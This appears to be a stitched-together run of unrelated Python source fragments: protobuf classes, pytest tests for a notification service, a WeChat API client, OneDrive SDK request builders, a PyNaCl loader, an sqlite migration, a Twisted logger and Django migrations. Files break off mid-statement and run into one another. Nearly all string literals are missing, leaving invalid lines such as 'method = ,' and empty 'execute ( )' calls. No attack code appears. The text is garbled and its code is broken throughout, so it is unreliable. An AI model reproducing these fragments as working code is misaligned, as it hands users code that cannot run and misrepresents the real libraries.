class PushNotification ( _message . Message ) : \n 
~~~ __metaclass__ = _reflection . GeneratedProtocolMessageType \n 
DESCRIPTOR = _PUSHNOTIFICATION \n 
\n 
# @@protoc_insertion_point(class_scope:PushNotification) \n 
\n 
\n 
~~ class BatchNotificationRequest ( _message . Message ) : \n 
~~~ __metaclass__ = _reflection . GeneratedProtocolMessageType \n 
DESCRIPTOR = _BATCHNOTIFICATIONREQUEST \n 
\n 
# @@protoc_insertion_point(class_scope:BatchNotificationRequest) \n 
\n 
\n 
~~ DESCRIPTOR . has_options = True \n 
DESCRIPTOR . _options = _descriptor . _ParseOptions ( descriptor_pb2 . FileOptions ( ) , # @@protoc_insertion_point(module_scope) \n 
import pytest \n 
from pushkin import pushkin_cli \n 
import tornado . web \n 
from pushkin import context \n 
from pushkin . database import database \n 
from pushkin . request . request_processor import RequestProcessor \n 
from pushkin . requesthandlers . events import JsonEventHandler \n 
from pushkin . requesthandlers . notifications import JsonNotificationHandler \n 
from pushkin import test_config_ini_path \n 
from pushkin import config \n 
\n 
\n 
@ pytest . fixture \n 
def setup_database ( ) : \n 
~~~ database . create_database ( ) \n 
\n 
\n 
~~ @ pytest . fixture \n 
def mock_processor ( mocker ) : \n 
~~~ \n 
mocker . patch ( ) \n 
mocker . patch ( ) \n 
\n 
\n 
~~ @ pytest . fixture \n 
def app ( ) : \n 
~~~ pushkin_cli . CONFIGURATION_FILENAME = test_config_ini_path \n 
pushkin_cli . init ( ) \n 
return pushkin_cli . create_app ( ) \n 
\n 
~~ @ pytest . fixture \n 
def notification_batch_json ( ) : \n 
~~~ \n 
return \'\'\'\n    {\n    "notifications": [\n            {\n                "login_id" : 1338,\n                "title" : "Msg title",\n                "content" : "Text of a message",\n                "screen" : "some_screen_id"\n            }\n        ]\n    }\n    \'\'\' \n 
\n 
~~ @ pytest . fixture \n 
def post_notification_url ( base_url ) : \n 
~~~ return base_url + config . json_notification_handler_url \n 
\n 
~~ @ pytest . fixture \n 
def event_batch_json ( ) : \n 
~~~ \n 
return \'\'\'\n    {\n    "events": [\n            {\n                "user_id" : 123,\n                "event_id" : 1,\n                "timestamp" : 12345,\n                "pairs": {\n                    "some_constant" : "6",\n                    "world_id" : "1"\n                }\n            }\n        ]\n    }\n    \'\'\' \n 
\n 
\n 
~~ @ pytest . fixture \n 
def post_event_url ( base_url ) : \n 
~~~ return base_url + config . json_event_handler_url \n 
\n 
\n 
~~ @ pytest . mark . gen_test \n 
@ pytest . mark . parametrize ( "input" , [ \n 
( ) , \n 
( ) , \n 
] ) \n 
def test_post_notification_empty_request ( setup_database , mock_processor , http_client , post_notification_url ~~~ request = tornado . httpclient . HTTPRequest ( post_notification_url , method = , body = input ) \n 
with pytest . raises ( tornado . httpclient . HTTPError ) : \n 
~~~ yield http_client . fetch ( request ) \n 
~~ assert not context . request_processor . submit . called \n 
\n 
\n 
~~ @ pytest . mark . gen_test \n 
def test_post_notification ( setup_database , mock_processor , http_client , post_notification_url , \n 
notification_batch_json ) : \n 
~~~ \n 
request = tornado . httpclient . HTTPRequest ( post_notification_url , method = , body = notification_batch_json response = yield http_client . fetch ( request ) \n 
assert response . code == 200 \n 
assert context . request_processor . submit . called \n 
\n 
\n 
~~ @ pytest . mark . gen_test \n 
@ pytest . mark . parametrize ( "input" , [ \n 
( ) , \n 
( ) , \n 
] ) \n 
def test_post_event_empty_request ( setup_database , mock_processor , http_client , post_event_url , input ~~~ \n 
request = tornado . httpclient . HTTPRequest ( post_event_url , method = , body = input ) \n 
with pytest . raises ( tornado . httpclient . HTTPError ) : \n 
~~~ yield http_client . fetch ( request ) \n 
~~ assert not context . request_processor . submit . called \n 
\n 
\n 
~~ @ pytest . mark . gen_test \n 
def test_post_event ( setup_database , mock_processor , http_client , post_event_url , event_batch_json ) : \n 
~~~ \n 
context . request_processor . submit . return_value = True \n 
request = tornado . httpclient . HTTPRequest ( post_event_url , method = , body = event_batch_json ) \n 
response = yield http_client . fetch ( request ) \n 
assert response . code == 200 \n 
assert context . request_processor . submit . called \n 
\n 
\n 
~~ @ pytest . mark . gen_test \n 
def test_post_event_service_unavailable ( setup_database , mock_processor , http_client , post_event_url , app ) : \n 
~~~ \n 
context . request_processor . submit . return_value = False \n 
request = tornado . httpclient . HTTPRequest ( post_event_url , method = , body = event_batch_json ) \n 
RequestProcessor . submit . return_value = False \n 
with pytest . raises ( tornado . httpclient . HTTPError ) : \n 
~~~ yield http_client . fetch ( request ) \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ import json \n 
import time \n 
import requests \n 
\n 
from pywechat . excepts import WechatError \n 
\n 
\n 
class Basic ( object ) : \n 
\n 
~~~ """The basic class of all services.\n\n    Attributes:\n        app_id: the app id of a wechat account.\n        app_secret: the app secret of a wechat account.\n        access_token: the access token requests from the wechat.\n        token_expires_time: the time that the access token will expire.\n    """ \n 
\n 
def __init__ ( self , app_id , app_secret ) : \n 
~~~ """Initializes the service.""" \n 
self . __app_id = app_id \n 
self . __app_secret = app_secret \n 
self . __access_token = self . access_token \n 
self . __token_expires_at = None \n 
\n 
~~ @ property \n 
def access_token ( self ) : \n 
~~~ \n 
# check the access token \n 
if self . __access_token and self . __token_expires_at : \n 
~~~ if self . __token_expires_at - time . time ( ) > 60 : \n 
~~~ return self . __access_token \n 
\n 
# if access token is invaild, grant it. \n 
~~ ~~ self . _grant_access_token ( ) \n 
return self . __access_token \n 
\n 
~~ def _send_request ( self , method , url , ** kwargs ) : \n 
~~~ """Sends a request to the server.\n\n        Args:\n            method: the method of request.(\'get\', \'post\', etc)\n            url: the request\'s url.\n            kwargs: the data will send to.\n\n        Returns:\n            the json data gets from the server.\n\n        Raises:\n            WechatError: to raise the exception if it contains the error.\n        """ \n 
if not kwargs . get ( ) : \n 
~~~ kwargs [ ] = { \n 
"access_token" : self . access_token \n 
} \n 
~~ if kwargs . get ( ) : \n 
~~~ data = json . dumps ( kwargs [ ] ) . encode ( ) \n 
kwargs [ "data" ] = data \n 
\n 
~~ request = requests . request ( \n 
method = method , \n 
url = url , \n 
** kwargs \n 
) \n 
\n 
request . raise_for_status ( ) \n 
json_data = request . json ( ) \n 
self . _check_wechat_error ( json_data ) \n 
return json_data \n 
\n 
~~ @ classmethod \n 
def _check_wechat_error ( cls , json_data ) : \n 
~~~ """Check whether the data from the plaform of wechat is an error.\n\n        Args:\n            json_data: the json data gained from the wechat.\n\n        Raises:\n            WechatError: to raise the exception if it contains the error.\n        """ \n 
errcode = json_data . get ( ) \n 
if errcode and errcode != 0 : \n 
~~~ raise WechatError ( errcode , json_data . get ( ) ) \n 
\n 
~~ ~~ def _grant_access_token ( self ) : \n 
~~~ """Gets the access token from wechat.\n\n        Public account can use this method with APPID and APPSecret to gain\n        the access token.\n\n        Link:\n        https://mp.weixin.qq.com/wiki/11/0e4b294685f817b95cbed85ba5e82b8f.html\n\n        Returns:\n            the json data.Example:\n            {"access_token":"ACCESS_TOKEN","expires_in":7200}\n\n        Raises:\n            WechatError: to raise the exception if it contains the error.\n        """ \n 
\n 
# Checks whether the access token is in memcache, \n 
url = \n 
params = { \n 
"grant_type" : "client_credential" , \n 
"appid" : self . __app_id , \n 
"secret" : self . __app_secret \n 
} \n 
json_data = self . _send_request ( , url , params = params ) \n 
self . __access_token = json_data . get ( ) \n 
self . __token_expires_at = int ( \n 
time . time ( ) ) + json_data . get ( ) \n 
return json_data \n 
\n 
~~ def _get_wechat_server_ips ( self ) : \n 
~~~ """Gets the ip list from wechat.\n\n        For the reason of security, it needs the list of ip addresses of wechat\n        to limit some conditions.\n\n        Link:\n        https://mp.weixin.qq.com/wiki/0/2ad4b6bfd29f30f71d39616c2a0fcedc.html\n\n        Returns:\n            the json data.Example:\n            {\n                "ip_list":["127.0.0.1","127.0.0.1"]\n            }\n\n        Raises:\n            WechatError: to raise the exception if it contains the error.\n        """ \n 
url = "https://api.weixin.qq.com/cgi-bin/getcallbackip" \n 
params = { \n 
"access_token" : self . access_token \n 
} \n 
json_data = self . _send_request ( , url , params = params ) \n 
return json_data \n 
# -*- coding: utf-8 -*-  \n 
~~ ~~ \'\'\'\n# Copyright (c) 2015 Microsoft Corporation\n# \n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the "Software"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n# \n# The above copyright notice and this permission notice shall be included in\n# all copies or substantial portions of the Software.\n# \n# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n# THE SOFTWARE.\n# \n#  This file was generated and any changes will be overwritten.\n\'\'\' \n 
\n 
from __future__ import unicode_literals \n 
from . . model . hashes import Hashes \n 
from . . one_drive_object_base import OneDriveObjectBase \n 
\n 
\n 
class File ( OneDriveObjectBase ) : \n 
\n 
~~~ def __init__ ( self , prop_dict = { } ) : \n 
~~~ self . _prop_dict = prop_dict \n 
\n 
~~ @ property \n 
def hashes ( self ) : \n 
~~~ """\n        Gets and sets the hashes\n        \n        Returns: \n            :class:`Hashes<onedrivesdk.model.hashes.Hashes>`:\n                The hashes\n        """ \n 
if "hashes" in self . _prop_dict : \n 
~~~ if isinstance ( self . _prop_dict [ "hashes" ] , OneDriveObjectBase ) : \n 
~~~ return self . _prop_dict [ "hashes" ] \n 
~~ else : \n 
~~~ self . _prop_dict [ "hashes" ] = Hashes ( self . _prop_dict [ "hashes" ] ) \n 
return self . _prop_dict [ "hashes" ] \n 
\n 
~~ ~~ return None \n 
\n 
~~ @ hashes . setter \n 
def hashes ( self , val ) : \n 
~~~ self . _prop_dict [ "hashes" ] = val \n 
~~ @ property \n 
def mime_type ( self ) : \n 
~~~ """Gets and sets the mimeType\n        \n        Returns: \n            str:\n                The mimeType\n        """ \n 
if "mimeType" in self . _prop_dict : \n 
~~~ return self . _prop_dict [ "mimeType" ] \n 
~~ else : \n 
~~~ return None \n 
\n 
~~ ~~ @ mime_type . setter \n 
def mime_type ( self , val ) : \n 
~~~ self . _prop_dict [ "mimeType" ] = val \n 
\n 
~~ ~~ \'\'\'\n------------------------------------------------------------------------------\n Copyright (c) 2015 Microsoft Corporation\n\n Permission is hereby granted, free of charge, to any person obtaining a copy\n of this software and associated documentation files (the "Software"), to deal\n in the Software without restriction, including without limitation the rights\n to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n copies of the Software, and to permit persons to whom the Software is\n furnished to do so, subject to the following conditions:\n\n The above copyright notice and this permission notice shall be included in\n all copies or substantial portions of the Software.\n\n THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n THE SOFTWARE.\n------------------------------------------------------------------------------\n\'\'\' \n 
\n 
\n 
class RequestBuilderBase ( object ) : \n 
\n 
~~~ def __init__ ( self , request_url , client ) : \n 
~~~ """Initialize a request builder which returns a request\n        when request() is called\n\n        Args:\n            request_url (str): The URL to construct the request\n                for\n            client (:class:`OneDriveClient<onedrivesdk.requests.one_drive_client.OneDriveClient>`):\n                The client with which the request will be made\n        """ \n 
self . _request_url = request_url \n 
self . _client = client \n 
\n 
~~ def append_to_request_url ( self , url_segment ) : \n 
~~~ """Appends a URL portion to the current request URL\n\n        Args:\n            url_segment (str): The segment you would like to append\n                to the existing request URL.\n        """ \n 
return self . _request_url + "/" + url_segment \n 
# -*- coding: utf-8 -*-  \n 
~~ ~~ \'\'\'\n# Copyright (c) 2015 Microsoft Corporation\n# \n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the "Software"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n# \n# The above copyright notice and this permission notice shall be included in\n# all copies or substantial portions of the Software.\n# \n# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n# THE SOFTWARE.\n# \n#  This file was generated and any changes will be overwritten.\n\'\'\' \n 
\n 
from __future__ import unicode_literals \n 
from . . collection_base import CollectionRequestBase , CollectionResponseBase , CollectionPageBase \n 
from . . request_builder_base import RequestBuilderBase \n 
from . . model . item import Item \n 
import json \n 
\n 
class SharedCollectionRequest ( CollectionRequestBase ) : \n 
\n 
~~~ def __init__ ( self , request_url , client , options ) : \n 
~~~ """Initialize the SharedCollectionRequest\n        \n        Args:\n            request_url (str): The url to perform the SharedCollectionRequest\n                on\n            client (:class:`OneDriveClient<onedrivesdk.request.one_drive_client.OneDriveClient>`):\n                The client which will be used for the request\n            options (list of :class:`Option<onedrivesdk.options.Option>`):\n                A list of options to pass into the request\n        """ \n 
super ( SharedCollectionRequest , self ) . __init__ ( request_url , client , options ) \n 
\n 
~~ def get ( self ) : \n 
~~~ """Gets the SharedCollectionPage\n\n        Returns: \n            :class:`SharedCollectionPage<onedrivesdk.request.shared_collection.SharedCollectionPage>`:\n                The SharedCollectionPage\n        """ \n 
self . method = "GET" \n 
collection_response = SharedCollectionResponse ( json . loads ( self . send ( ) . content ) ) \n 
return self . _page_from_response ( collection_response ) \n 
\n 
\n 
~~ ~~ class SharedCollectionRequestBuilder ( RequestBuilderBase ) : \n 
\n 
~~~ def __getitem__ ( self , key ) : \n 
~~~ """Get the ItemRequestBuilder with the specified key\n        \n        Args:\n            key (str): The key to get a ItemRequestBuilder for\n        \n        Returns: \n            :class:`ItemRequestBuilder<onedrivesdk.request.item_request_builder.ItemRequestBuilder>`:\n                A ItemRequestBuilder for that key\n        """ \n 
return ItemRequestBuilder ( self . append_to_request_url ( str ( key ) ) , self . _client ) \n 
\n 
~~ def request ( self , expand = None , select = None , top = None , order_by = None , options = None ) : \n 
~~~ """Builds the SharedCollectionRequest\n        \n        Args:\n            expand (str): Default None, comma-seperated list of relationships\n                to expand in the response.\n            select (str): Default None, comma-seperated list of properties to\n                include in the response.\n            top (int): Default None, the number of items to return in a result.\n            order_by (str): Default None, comma-seperated list of properties\n                that are used to sort the order of items in the response.\n            options (list of :class:`Option<onedrivesdk.options.Option>`):\n                A list of options to pass into the request. Defaults to None.\n\n        Returns:\n            :class:`SharedCollectionRequest<onedrivesdk.request.shared_collection.SharedCollectionRequest>`:\n                The SharedCollectionRequest\n        """ \n 
req = SharedCollectionRequest ( self . _request_url , self . _client , options ) \n 
req . _set_query_options ( expand = expand , select = select , top = top , order_by = order_by ) \n 
return req \n 
\n 
~~ def get ( self ) : \n 
~~~ """Gets the SharedCollectionPage\n\n        Returns: \n            :class:`SharedCollectionPage<onedrivesdk.request.shared_collection.SharedCollectionPage>`:\n                The SharedCollectionPage\n        """ \n 
return self . request ( ) . get ( ) \n 
\n 
\n 
\n 
~~ ~~ class SharedCollectionResponse ( CollectionResponseBase ) : \n 
\n 
~~~ @ property \n 
def collection_page ( self ) : \n 
~~~ """The collection page stored in the response JSON\n        \n        Returns:\n            :class:`SharedCollectionPage<onedrivesdk.request.shared_collection.SharedCollectionPage>`:\n                The collection page\n        """ \n 
if self . _collection_page : \n 
~~~ self . _collection_page . _prop_list = self . _prop_dict [ "value" ] \n 
~~ else : \n 
~~~ self . _collection_page = SharedCollectionPage ( self . _prop_dict [ "value" ] ) \n 
\n 
~~ return self . _collection_page \n 
\n 
\n 
~~ ~~ class SharedCollectionPage ( CollectionPageBase ) : \n 
\n 
~~~ def __getitem__ ( self , index ) : \n 
~~~ """Get the Item at the index specified\n        \n        Args:\n            index (int): The index of the item to get from the SharedCollectionPage\n\n        Returns:\n            :class:`Item<onedrivesdk.model.item.Item>`:\n                The Item at the index\n        """ \n 
return Item ( self . _prop_list [ index ] ) \n 
\n 
~~ def shared ( self ) : \n 
~~~ """Get a generator of Item within the SharedCollectionPage\n        \n        Yields:\n            :class:`Item<onedrivesdk.model.item.Item>`:\n                The next Item in the collection\n        """ \n 
for item in self . _prop_list : \n 
~~~ yield Item ( item ) \n 
\n 
~~ ~~ def _init_next_page_request ( self , next_page_link , client , options ) : \n 
~~~ """Initialize the next page request for the SharedCollectionPage\n        \n        Args:\n            next_page_link (str): The URL for the next page request\n                to be sent to\n            client (:class:`OneDriveClient<onedrivesdk.model.one_drive_client.OneDriveClient>`:\n                The client to be used for the request\n            options (list of :class:`Option<onedrivesdk.options.Option>`:\n                A list of options\n        """ \n 
self . _next_page_request = SharedCollectionRequest ( next_page_link , client , options ) \n 
\n 
\n 
~~ ~~ from . . request . item_request_builder import ItemRequestBuilder \n 
# -*- coding: utf-8; -*- \n 
# \n 
# The MIT License (MIT) \n 
# \n 
# Copyright (c) 2014 Flavien Charlon \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in all \n 
# copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE \n 
# SOFTWARE. \n 
\n 
"""\nReference implementation of the Open Assets Protocol.\n""" \n 
\n 
__version__ = # Copyright 2013 Donald Stufft and individual contributors \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
from __future__ import absolute_import , division , print_function \n 
\n 
import glob \n 
import os . path \n 
\n 
from cffi import FFI \n 
from cffi . verifier import Verifier \n 
\n 
\n 
__all__ = [ "ffi" ] \n 
\n 
\n 
HEADERS = glob . glob ( \n 
os . path . join ( os . path . abspath ( os . path . dirname ( __file__ ) ) , "*.h" ) \n 
) \n 
\n 
\n 
# Build our FFI instance \n 
ffi = FFI ( ) \n 
\n 
\n 
# Add all of our header files, but sort first for consistency of the \n 
# hash that CFFI generates and uses in the .so filename (the order of \n 
# glob() results cannot be relied on) \n 
for header in sorted ( HEADERS ) : \n 
~~~ with open ( header , "r" ) as hfile : \n 
~~~ ffi . cdef ( hfile . read ( ) ) \n 
\n 
\n 
# TODO: Can we use the ABI of libsodium for this instead? \n 
~~ ~~ ffi . verifier = Verifier ( \n 
ffi , \n 
\n 
"#include <sodium.h>" , \n 
\n 
# We need to link to the sodium library \n 
libraries = [ "sodium" ] , \n 
\n 
# Our ext_package is nacl so look for it \n 
ext_package = "nacl._lib" , \n 
) \n 
\n 
\n 
class Library ( object ) : \n 
\n 
~~~ def __init__ ( self , ffi ) : \n 
~~~ self . ffi = ffi \n 
self . _lib = None \n 
\n 
# This prevents the compile_module() from being called, the module \n 
# should have been compiled by setup.py \n 
def _compile_module ( * args , ** kwargs ) : \n 
~~~ raise RuntimeError ( "Cannot compile module during runtime" ) \n 
~~ self . ffi . verifier . compile_module = _compile_module \n 
\n 
~~ def __getattr__ ( self , name ) : \n 
~~~ if self . _lib is None : \n 
~~~ self . _lib = self . ffi . verifier . load_library ( ) \n 
\n 
# redirect attribute access to the underlying lib \n 
~~ return getattr ( self . _lib , name ) \n 
\n 
~~ ~~ lib = Library ( ffi ) \n 
import sqlite3 \n 
\n 
\n 
def migrate ( database_path ) : \n 
~~~ print "migrating to db version 1" \n 
conn = sqlite3 . connect ( database_path ) \n 
conn . text_factory = str \n 
cursor = conn . cursor ( ) \n 
\n 
# read notifications from db \n 
cursor . execute ( ) \n 
notifications = cursor . fetchall ( ) \n 
\n 
# delete notifications table \n 
cursor . execute ( ) \n 
\n 
# create new table \n 
cursor . execute ( ) \n 
cursor . execute ( ) \n 
\n 
# write notifications back into db \n 
for n in notifications : \n 
~~~ cursor . execute ( , ( n [ 0 ] , n [ 1 ] , n [ 2 ] , n [ 3 ] , n [ 4 ] , n [ 5 ] , n [ 6 ] , n [ 7 ] , \n 
# update version \n 
~~ cursor . execute ( ) \n 
conn . commit ( ) \n 
conn . close ( ) \n 
~~ """\nCopyright (c) 2014 Brian Muller\n""" \n 
\n 
import sys \n 
from twisted . python import log \n 
\n 
DEBUG = 5 \n 
WARNING = 4 \n 
INFO = 3 \n 
ERROR = 2 \n 
CRITICAL = 1 \n 
\n 
levels = { "debug" : 5 , "warning" : 4 , "info" : 3 , "error" : 2 , "critical" : 1 } \n 
\n 
class FileLogObserver ( log . FileLogObserver ) : \n 
~~~ def __init__ ( self , f = None , level = "info" , default = DEBUG ) : \n 
~~~ log . FileLogObserver . __init__ ( self , f or sys . stdout ) \n 
self . level = levels [ level ] \n 
self . default = default \n 
\n 
~~ def emit ( self , eventDict ) : \n 
~~~ ll = eventDict . get ( , self . default ) \n 
if eventDict [ ] or in eventDict or self . level >= ll : \n 
~~~ log . FileLogObserver . emit ( self , eventDict ) \n 
\n 
\n 
~~ ~~ ~~ class Logger ( object ) : \n 
~~~ def __init__ ( self , ** kwargs ) : \n 
~~~ self . kwargs = kwargs \n 
\n 
~~ def msg ( self , message , ** kw ) : \n 
~~~ kw . update ( self . kwargs ) \n 
if in kw and not isinstance ( kw [ ] , str ) : \n 
~~~ kw [ ] = kw [ ] . __class__ . __name__ \n 
~~ log . msg ( message , ** kw ) \n 
\n 
~~ def info ( self , message , ** kw ) : \n 
~~~ kw [ ] = INFO \n 
self . msg ( "[INFO] %s" % message , ** kw ) \n 
\n 
~~ def debug ( self , message , ** kw ) : \n 
~~~ kw [ ] = DEBUG \n 
self . msg ( "[DEBUG] %s" % message , ** kw ) \n 
\n 
~~ def warning ( self , message , ** kw ) : \n 
~~~ kw [ ] = WARNING \n 
self . msg ( "[WARNING] %s" % message , ** kw ) \n 
\n 
~~ def error ( self , message , ** kw ) : \n 
~~~ kw [ ] = ERROR \n 
self . msg ( "[ERROR] %s" % message , ** kw ) \n 
\n 
~~ def critical ( self , message , ** kw ) : \n 
~~~ kw [ ] = CRITICAL \n 
self . msg ( "[CRITICAL] %s" % message , ** kw ) \n 
\n 
\n 
~~ ~~ try : \n 
~~~ theLogger \n 
~~ except NameError : \n 
~~~ theLogger = Logger ( ) \n 
msg = theLogger . msg \n 
info = theLogger . info \n 
debug = theLogger . debug \n 
warning = theLogger . warning \n 
error = theLogger . error \n 
critical = theLogger . critical \n 
# Generated by the protocol buffer compiler.  DO NOT EDIT! \n 
# source: peers.proto \n 
\n 
#pylint: skip-file \n 
\n 
~~ import sys \n 
_b = sys . version_info [ 0 ] < 3 and ( lambda x : x ) or ( lambda x : x . encode ( ) ) \n 
from google . protobuf import descriptor as _descriptor \n 
from google . protobuf import message as _message \n 
from google . protobuf import reflection as _reflection \n 
from google . protobuf import symbol_database as _symbol_database \n 
from google . protobuf import descriptor_pb2 \n 
# @@protoc_insertion_point(imports) \n 
\n 
_sym_db = _symbol_database . Default ( ) \n 
\n 
\n 
\n 
\n 
DESCRIPTOR = _descriptor . FileDescriptor ( \n 
name = , \n 
package = , \n 
serialized_pb = _b ( \'\\n\\x0bpeers.proto\\"6\\n\\tPeerSeeds\\x12\\x16\\n\\x0eserializedNode\\x18\\x01 \\x03(\\x0c\\x12\\x11\\n\\tsignature\\x18\\x02 \\x02(\\x0c\' ) \n 
_sym_db . RegisterFileDescriptor ( DESCRIPTOR ) \n 
\n 
\n 
\n 
\n 
_PEERSEEDS = _descriptor . Descriptor ( \n 
name = , \n 
full_name = , \n 
filename = None , \n 
file = DESCRIPTOR , \n 
containing_type = None , \n 
fields = [ \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 0 , \n 
number = 1 , type = 12 , cpp_type = 9 , label = 3 , \n 
has_default_value = False , default_value = [ ] , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 1 , \n 
number = 2 , type = 12 , cpp_type = 9 , label = 2 , \n 
has_default_value = False , default_value = _b ( "" ) , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
] , \n 
extensions = [ \n 
] , \n 
nested_types = [ ] , \n 
enum_types = [ \n 
] , \n 
options = None , \n 
is_extendable = False , \n 
extension_ranges = [ ] , \n 
oneofs = [ \n 
] , \n 
serialized_start = 15 , \n 
serialized_end = 69 , \n 
) \n 
\n 
DESCRIPTOR . message_types_by_name [ ] = _PEERSEEDS \n 
\n 
PeerSeeds = _reflection . GeneratedProtocolMessageType ( , ( _message . Message , ) , dict ( \n 
DESCRIPTOR = _PEERSEEDS , \n 
__module__ = \n 
# @@protoc_insertion_point(class_scope:PeerSeeds) \n 
) ) \n 
_sym_db . RegisterMessage ( PeerSeeds ) \n 
\n 
\n 
# @@protoc_insertion_point(module_scope) \n 
from django import template \n 
\n 
register = template . Library ( ) \n 
\n 
@ register . filter ( name = ) \n 
def get_item ( dictionary , key ) : \n 
~~~ return getattr ( dictionary , key ) \n 
~~ default_app_config = \n 
from . . utils . access_permissions import BaseAccessPermissions \n 
\n 
\n 
class MediafileAccessPermissions ( BaseAccessPermissions ) : \n 
~~~ """\n    Access permissions container for Mediafile and MediafileViewSet.\n    """ \n 
def can_retrieve ( self , user ) : \n 
~~~ """\n        Returns True if the user has read access model instances.\n        """ \n 
return user . has_perm ( ) \n 
\n 
~~ def get_serializer_class ( self , user = None ) : \n 
~~~ """\n        Returns serializer class.\n        """ \n 
from . serializers import MediafileSerializer \n 
\n 
return MediafileSerializer \n 
# -*- coding: utf-8 -*- \n 
# Generated by Django 1.9.2 on 2016-03-06 14:33 \n 
~~ ~~ from __future__ import unicode_literals \n 
\n 
from django . db import migrations , models \n 
\n 
import openslides . utils . models \n 
\n 
\n 
class Migration ( migrations . Migration ) : \n 
\n 
~~~ initial = True \n 
\n 
dependencies = [ \n 
( , ) , \n 
# The next line is not a dependency because we also want to support Django 1.8. \n 
\n 
] \n 
\n 
operations = [ \n 
migrations . CreateModel ( \n 
name = , \n 
fields = [ \n 
( , models . AutoField ( auto_created = True , primary_key = True , serialize = False , verbose_name ( , models . CharField ( max_length = 128 , verbose_name = ) ) , \n 
( , models . DateTimeField ( blank = True , null = True , verbose_name = ( , models . BooleanField ( \n 
default = False , \n 
help_text = verbose_name = ) ) , \n 
( , models . CharField ( blank = True , max_length = 255 , unique = True ) ) , \n 
( , models . CharField ( blank = True , max_length = 255 ) ) , \n 
( , models . CharField ( blank = True , max_length = 255 ) ) , \n 
( , models . CharField ( blank = True , default = , max_length = 255 ) ) , \n 
( , models . CharField ( blank = True , default = , max_length = 50 ) ) , \n 
( , models . TextField ( blank = True , default = ) ) , \n 
( , models . TextField ( blank = True , default = ) ) , \n 
( , models . CharField ( blank = True , default = , max_length = 100 ) ) , \n 
( , models . BooleanField ( default = True ) ) , \n 
( , models . BooleanField ( default = False ) ) , \n 
( , models . ManyToManyField ( \n 
blank = True , \n 
help_text = related_name = , \n 
related_query_name = , \n 
to = , \n 
verbose_name = ) ) , \n 
( , models . ManyToManyField ( \n 
blank = True , \n 
help_text = , \n 
related_name = , \n 
related_query_name = , \n 
to = , \n 
verbose_name = ) ) , \n 
] , \n 
options = { \n 
: ( \n 
( , ) , \n 
( , ) ( , ) ) , \n 
: ( ) , \n 
: ( , , ) , \n 
} , \n 
